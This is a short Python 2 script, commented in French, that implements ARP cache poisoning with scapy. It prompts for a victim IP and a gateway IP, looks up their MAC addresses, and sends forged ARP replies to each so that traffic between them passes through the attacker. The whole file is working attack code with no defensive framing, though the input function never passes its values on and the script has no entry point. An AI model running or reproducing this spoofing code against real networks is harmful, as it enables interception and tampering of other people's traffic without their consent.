#!/usr/bin/env python
# -*- coding: utf-8 -*-


#################################################
#Auteur: Vikrant SINGH                          #
#Programme: ARP Poisoning                       #
#                                               #
#################################################


#################################################
#####################Imports#####################

from Tkinter import *
from scapy.all import *
import sys
#################################################

def information () :
	interface = raw_input("interface réseau :")
	ipvictime = raw_input("IP de la victime:")
	iprouteur = raw_input("IP du routeur GW :")


def get_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src


def poison(iprouteur, ipvictime):
    victimMAC = get_mac(ipvictime)
    routerMAC = get_mac(iprouteur)
    send(ARP(op =2, pdst = ipvictime, psrc = iprouteur, hwdst = victimMAC))
    send(ARP(op = 2, pdst = iprouteur, psrc = ipvictime, hwdst = routerMAC))


